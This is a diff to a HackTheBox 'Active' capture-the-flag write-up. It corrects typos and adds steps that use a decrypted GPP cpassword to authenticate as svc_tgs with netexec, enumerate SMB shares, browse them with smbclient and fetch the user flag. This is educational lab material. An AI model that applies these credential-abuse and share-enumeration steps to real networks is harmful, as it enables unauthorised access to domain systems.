@@ -239,7 +239,7 @@ active.htb
 
 <br />
 
-The `groups.xml` inmediately caught my attention:
+The `groups.xml` immediately caught my attention:
 
 <br />
 
@@ -267,7 +267,7 @@ So, what is the problem?
 
 The issue is that the key used to encrypt the `cpassword` was publicly disclosed. Although this vulnerability was patched in `MS14-025`, it does not prevent exploitation of previously created entries.
 
-For a deeper understading of this attack, refer to [this post](https://n1chr0x.medium.com/unwrapping-gpp-exposing-the-cpassword-attack-vector-using-active-htb-machine-4d3b97e0ac43)
+For a deeper understanding of this attack, refer to [this post](https://n1chr0x.medium.com/unwrapping-gpp-exposing-the-cpassword-attack-vector-using-active-htb-machine-4d3b97e0ac43)
 
 <br />
 
@@ -277,7 +277,7 @@ For a deeper understading of this attack, refer to [this post](https://n1chr0x.m
 
 The most commonly used tool to decrypt the `cpassword` is `gpp-decrypt`, written in Ruby.
 
-We can use it with the following:
+We can run it with the following command:
 
 <br />
 
@@ -296,6 +296,71 @@ Next, we verify the credentials using `netexec`:
 ❯ netexec smb active.htb -u "svc_tgs" -p "GPPstillStandingStrong2k18"
 SMB         10.10.10.100    445    DC               [*] Windows 7 / Server 2008 R2 Build 7601 x64 (name:DC) (domain:active.htb) (signing:True) (SMBv1:False)
 SMB         10.10.10.100    445    DC               [+] active.htb\svc_tgs:GPPstillStandingStrong2k18 
+```
+
+<br />
+
+The credentials work! Let's enumerate the available shares for `svc_tgs`:
+
+<br />
+
+```bash
+❯ netexec smb active.htb -u "svc_tgs" -p "GPPstillStandingStrong2k18" --shares
+SMB         10.10.10.100    445    DC               [*] Windows 7 / Server 2008 R2 Build 7601 x64 (name:DC) (domain:active.htb) (signing:True) (SMBv1:False)
+SMB         10.10.10.100    445    DC               [+] active.htb\svc_tgs:GPPstillStandingStrong2k18 
+SMB         10.10.10.100    445    DC               [*] Enumerated shares
+SMB         10.10.10.100    445    DC               Share           Permissions     Remark
+SMB         10.10.10.100    445    DC               -----           -----------     ------
+SMB         10.10.10.100    445    DC               ADMIN$                          Remote Admin
+SMB         10.10.10.100    445    DC               C$                              Default share
+SMB         10.10.10.100    445    DC               IPC$                            Remote IPC
+SMB         10.10.10.100    445    DC               NETLOGON        READ            Logon server share 
+SMB         10.10.10.100    445    DC               Replication     READ            
+SMB         10.10.10.100    445    DC               SYSVOL          READ            Logon server share 
+SMB         10.10.10.100    445    DC               Users           READ    
+```
+
+<br />
+
+We have read access to the `Users` share:
+
+We can access this share using `smbclient`:
+
+<br />
+
+```bash
+❯ smbclient //active.htb/Users -U "svc_tgs"
+Password for [WORKGROUP\svc_tgs]:
+Try "help" to get a list of possible commands.
+smb: \> ls
+  .                                  DR        0  Sat Jul 21 16:39:20 2018
+  ..                                 DR        0  Sat Jul 21 16:39:20 2018
+  Administrator                       D        0  Mon Jul 16 12:14:21 2018
+  All Users                       DHSrn        0  Tue Jul 14 07:06:44 2009
+  Default                           DHR        0  Tue Jul 14 08:38:21 2009
+  Default User                    DHSrn        0  Tue Jul 14 07:06:44 2009
+  desktop.ini                       AHS      174  Tue Jul 14 06:57:55 2009
+  Public                             DR        0  Tue Jul 14 06:57:55 2009
+  SVC_TGS                             D        0  Sat Jul 21 17:16:32 2018
+
+		5217023 blocks of size 4096. 277800 blocks available
+```
+
+<br />
+
+And get the `user.txt` flag from the `svc_tgs` desktop:
+
+<br />
+
+```bash
+smb: \svc_tgs\Desktop\> get user.txt
+getting file \svc_tgs\Desktop\user.txt of size 34 as user.txt (0,2 KiloBytes/sec) (average 0,2 KiloBytes/sec)
+smb: \svc_tgs\Desktop\> 
+```
+
+```bash
+❯ /usr/bin/cat user.txt
+9dbbbca02bf0ac20bbe7cb0257xxxxxx
 ```
 
 <br />
